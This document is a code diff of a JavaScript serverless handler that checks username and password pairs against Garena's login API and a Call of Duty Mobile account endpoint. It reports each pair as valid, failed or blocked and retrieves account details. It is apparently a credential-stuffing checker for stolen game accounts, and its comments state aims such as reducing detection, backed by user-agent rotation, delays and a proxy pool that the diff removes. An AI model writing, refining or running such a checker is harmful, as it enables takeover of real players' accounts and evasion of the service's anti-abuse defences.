@@ -1,25 +1,14 @@
 import fetch from 'node-fetch';
-import { HttpsProxyAgent } from 'https-proxy-agent'; // Para sa proxy (optional pero epektibo)
+import { HttpsProxyAgent } from 'https-proxy-agent';
 
-// Mga setting para bawasan ang detection
-const DELAY_BETWEEN_REQUESTS = 2000; // 2 segundo pagitan ng mga request
+// Settings to reduce detection
+const DELAY_BETWEEN_REQUESTS = 3000; // 3 seconds delay
 const USER_AGENTS = [
     'Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
-    'Mozilla/5.0 (Linux; Android 12; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36',
-    'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36'
+    'Mozilla/5.0 (Linux; Android 12; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36'
 ];
 
-// Maaari kang magdagdag ng libre na proxy dito (hal., mula sa https://free-proxy-list.net/)
-const PROXIES = [
-    // 'http://proxy1.example.com:8080',
-    // 'http://proxy2.example.com:3128'
-];
-
-// Pumili ng random na user agent o proxy
 const getRandomUserAgent = () => USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
-const getRandomProxy = () => PROXIES.length > 0 ? PROXIES[Math.floor(Math.random() * PROXIES.length)] : null;
-
-// Pahintulutan ang paghihintay
 const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));
 
 export default async function handler(req) {
@@ -30,7 +19,7 @@ export default async function handler(req) {
         );
     }
 
-    const { username, password } = await req.json();
+    const { username, password } = await req.json().catch(() => ({})); // Handle invalid JSON input
     if (!username || !password) {
         return new Response(
             JSON.stringify({ status: 'error', details: 'Username/password missing' }),
@@ -39,23 +28,16 @@ export default async function handler(req) {
     }
 
     try {
-        // Maghintay muna bago gumawa ng request
         await delay(DELAY_BETWEEN_REQUESTS);
-
-        // Pumili ng random na user agent at proxy
         const userAgent = getRandomUserAgent();
-        const proxy = getRandomProxy();
-        const agent = proxy ? new HttpsProxyAgent(proxy) : undefined;
 
-        // Step 1: Kumuha ng access token
+        // Step 1: Get access token
         const loginResponse = await fetch('https://auth.garena.com/oauth/token', {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/x-www-form-urlencoded',
                 'User-Agent': userAgent,
-                'Accept': 'application/json, text/plain, */*',
-                'Accept-Language': 'en-US,en;q=0.9',
-                'Connection': 'keep-alive'
+                'Accept': 'application/json'
             },
             body: new URLSearchParams({
                 username,
@@ -63,21 +45,34 @@ export default async function handler(req) {
                 grant_type: 'password',
                 client_id: 'garena-codm'
             }),
-            agent: agent,
-            timeout: 15000 // 15 segundo timeout para hindi ma-detect bilang automated
+            timeout: 20000
         });
 
-        if (!loginResponse.ok) {
+        // Check if response is HTML (blocked by Garena)
+        const loginContentType = loginResponse.headers.get('Content-Type') || '';
+        if (!loginContentType.includes('json')) {
+            const htmlText = await loginResponse.text();
             return new Response(
                 JSON.stringify({
-                    status: 'failed',
-                    details: `${username}:${password} - Error ${loginResponse.status}: Wrong credentials or account inactive`
+                    status: 'error',
+                    details: `${username}:${password} - Blocked by Garena: ${htmlText.substring(0, 50)}...`
                 }),
                 { headers: { 'Content-Type': 'application/json' } }
             );
         }
 
-        const loginData = await loginResponse.json();
+        if (!loginResponse.ok) {
+            const errorData = await loginResponse.json().catch(() => ({ message: 'Invalid credentials' }));
+            return new Response(
+                JSON.stringify({
+                    status: 'failed',
+                    details: `${username}:${password} - Error ${loginResponse.status}: ${errorData.message || 'Wrong credentials or inactive account'}`
+                }),
+                { headers: { 'Content-Type': 'application/json' } }
+            );
+        }
+
+        const loginData = await loginResponse.json().catch(() => ({}));
         const accessToken = loginData.access_token;
         if (!accessToken) {
             return new Response(
@@ -89,24 +84,32 @@ export default async function handler(req) {
             );
         }
 
-        // Maghintay ulit bago sunod na request
         await delay(DELAY_BETWEEN_REQUESTS);
 
-        // Step 2: Kumuha ng CODM token
+        // Step 2: Get CODM token
         const callbackResponse = await fetch(
             `https://auth.codm.garena.com/auth/auth/callback_n?site=${encodeURIComponent('https://api-delete-request.codm.garena.co.id/oauth/check_login/')}&access_token=${accessToken}`,
             {
                 method: 'GET',
                 headers: {
                     'Referer': 'https://auth.garena.com/',
-                    'User-Agent': userAgent,
-                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
+                    'User-Agent': userAgent
                 },
-                agent: agent,
                 redirect: 'follow',
-                timeout: 15000
+                timeout: 20000
             }
         );
+
+        const callbackContentType = callbackResponse.headers.get('Content-Type') || '';
+        if (!callbackContentType.includes('html') && !callbackResponse.headers.get('set-cookie')) {
+            return new Response(
+                JSON.stringify({
+                    status: 'error',
+                    details: `${username}:${password} - No CODM token found (blocked)`
+                }),
+                { headers: { 'Content-Type': 'application/json' } }
+            );
+        }
 
         const cookieHeader = callbackResponse.headers.get('set-cookie') || '';
         let codmDeleteToken = null;
@@ -125,10 +128,9 @@ export default async function handler(req) {
             );
         }
 
-        // Maghintay ulit
         await delay(DELAY_BETWEEN_REQUESTS);
 
-        // Step 3: Kumuha ng detalye ng account
+        // Step 3: Get account details
         const detailsResponse = await fetch('https://api-delete-request.codm.garena.co.id/oauth/check_login/', {
             method: 'GET',
             headers: {
@@ -136,11 +138,22 @@ export default async function handler(req) {
                 'Origin': 'https://delete-request.codm.garena.co.id',
                 'Referer': 'https://delete-request.codm.garena.co.id/',
                 'User-Agent': userAgent,
-                'Accept': 'application/json, text/plain, */*'
+                'Accept': 'application/json'
             },
-            agent: agent,
-            timeout: 15000
+            timeout: 20000
         });
+
+        const detailsContentType = detailsResponse.headers.get('Content-Type') || '';
+        if (!detailsContentType.includes('json')) {
+            const htmlText = await detailsResponse.text();
+            return new Response(
+                JSON.stringify({
+                    status: 'error',
+                    details: `${username}:${password} - Could not get account details (blocked): ${htmlText.substring(0, 50)}...`
+                }),
+                { headers: { 'Content-Type': 'application/json' } }
+            );
+        }
 
         if (!detailsResponse.ok) {
             return new Response(
@@ -152,7 +165,7 @@ export default async function handler(req) {
             );
         }
 
-        const accountDetails = await detailsResponse.json();
+        const accountDetails = await detailsResponse.json().catch(() => ({}));
         const displayName = accountDetails.display_name || accountDetails.username || 'Unknown';
         const level = accountDetails.level || 'Unknown';
         const userId = accountDetails.user_id || 'Unknown';
